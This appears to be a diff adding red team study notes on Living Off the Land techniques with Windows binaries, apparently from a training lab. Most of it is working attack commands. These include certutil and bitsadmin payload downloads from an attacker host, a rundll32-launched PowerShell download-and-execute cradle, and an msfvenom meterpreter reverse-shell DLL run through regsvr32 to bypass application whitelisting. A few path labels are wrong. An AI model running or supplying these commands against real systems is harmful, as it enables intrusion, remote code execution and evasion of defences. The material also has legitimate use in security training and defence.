@@ -1,0 +1,122 @@
+Microsoft-signed and built-in tools used as Living Off the Land techniques,
+including binaries, scripts, and libraries for Red Team Operations 
+
+Living Off the Land Binaries And Scripts (LOLBAS)
+Source: https://lolbas-project.github.io/#
+
+Files operations:
+  certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+                                Certutil can transfer and encode files
+                                Download a file from an attacker's web server and store it in the Window's temporary folder
+                                -urlcache and -split -f parameters to enforce the tool to download from the provided URL
+                                using the split technique
+  certutil -encode payload.exe Encoded-payload.txt
+                                Encode files and decode the content of files. ATT&CK T1027 refers to this technique to
+                                obfuscate files to make them difficult to discover or analyze
+  bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+                                BITSAdmin - System administrator utility that can be used to create, download or upload 
+                                Background Intelligent Transfer Service (BITS) jobs and check their progress.
+                                Abuse the BITS jobs to download and execute a malicious payload in a compromised machine.
+  netstat -an| findstr "445"    Findstr is used to find text and string patterns in files
+                                Pipe the result of `netstat` to check whether port `445` is open on the machine
+  findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+                                Download remote files from SMB shared folders within the network
+                                
+Certutil Options:
+  -urlcache   Display URL, enables the URL option to use in the command
+  -split -f   Split and force fetching files from the provided URL
+
+BITSAdmin Options:
+  /Transfer   Use the transfer option
+  /Download   specify transfer using download type
+  /Priority   Set the priority of the job to be running in the foreground
+
+FindStr Options:
+  /V           Print out the lines that don't contain the string provided
+  dummystring  Text to be searched for; in this case, we provide a string that must not be found in a file
+  > c:\Windows\Temp\test.exe
+              Redirect the output to a file on the target machine
+
+File Execution/Arbitrary code execution:
+  explorer.exe /root,"C:\Windows\System32\calc.exe"
+                                Create a child process of `explorer.exe` parent (calculator)
+                                This technique is called Signed Binary Proxy Execution or Indirect Command
+                                Execution, where the attacker leverages other system tools to spawn malicious payloads.
+                                File Explorer can execute other .exe files. This technique is called Indirect 
+                                Command Execution, where the explorer.exe tool can be used and abused to
+                                launch malicious scripts or executables from a trusted parent process
+  wmic.exe process call create calc
+                                WMIC command creates a new process of a binary of our choice, `calc.exe`
+                                Windows Management Instrumentation (WMIC) is used to execute binaries for
+                                evading defensive measures. The MITRE ATT&CK framework refers to this 
+                                technique as Signed Binary Proxy Execution (T1218)
+  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+                                Execute a calc.exe binary (embeds a JavaScript component, `eval()`, to execute the `calc.exe` binary)
+                                rundll32.exe can run arbitrary payloads and execute JavaScript and PowerShell scripts.
+                                The MITRE ATT&CK framework identifies this as Signed Binary Proxy Execution:
+                                `Rundll32` and refers to it as T1218
+  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+                                Execute PowerShell scripts using the `rundll32.exe`. The following command runs a JavaScript that executes
+                                a PowerShell script to download from a remote website using `rundll32.exe`. As a result, a copy of the `script.ps1`
+                                downloaded into memory on the target machine
+
+Application Whitelisting Bypasses:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
+                                Create a malicious DLL file using `msvenom` and set up our  Metasploit listener to receive a reverse shell
+                                Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the `regsvr32.exe`
+                                Application Whitelisting Bypass technique to run a command on a target system.
+                                We specified the output type as `DLL` using the `-f` argument
+msfconsole -q
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST ATTACKBOX_IP
+  set LPORT 443
+  exploit
+python3 -m http.server 1337     Once the malicious `DLL` file is generated, we need to deliver the payload to the victim machine. 
+                                We will do this by using a webserver to serve the `DLL` file on our attacking machine
+                                From the victim machine, visit the webserver of the attacking machine on port `1337` that we specify.
+c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
+or
+c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+                                Once the file `DLL` file is downloaded, we execute it using `regsvr32.exe`. We should receive a reverse shell.
+                                Note if we wanted to create a 64-bit `DLL` version, we need to specify it in the `msfvenom` command and
+                                run it from the victim machine using the `64bits` version of `regsvr32.exe` at `C:\Windows\SysWOW64\regsvr32.exe`.
+
+Regsvr32 Options (second option):
+ 	/s   Silent mode (without showing messages)
+ 	/n   Not call the DLL register server
+ 	/i:: Use another server since we used /n
+ 	/u   Run with unregister method
+
+
+Lateral movement:
+
+Security product bypass:
+
+
+Informational:
+Living Off the Land encompasses categories:
+  Reconnaissance
+  Files operations
+  Arbitrary code execution
+  Lateral movement
+  Security product bypass 
+
+LOLBAS Website search:
+It is straightforward to look for a binary; including the binary name will show the result. 
+To look for a specific function, we require providing a `/` before the function name. For instance, to look for 
+all execute functions, we should use `/execute`. 
+In order to look based on types, we should use the `#` symbol followed by the type name.
+The following are the types included in the project:
+  Script
+  Binary
+  Libraries
+  OtherMSBinaries
+
+The explorer.exe binary is located at:
+  C:\Windows\explorer.exe for the Windows 32 bits version
+  C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version
+
+The rundll32.exe binary is located at:
+	C:\Windows\System32\rundll32.exe for the Windows 32 bits version
+	C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version
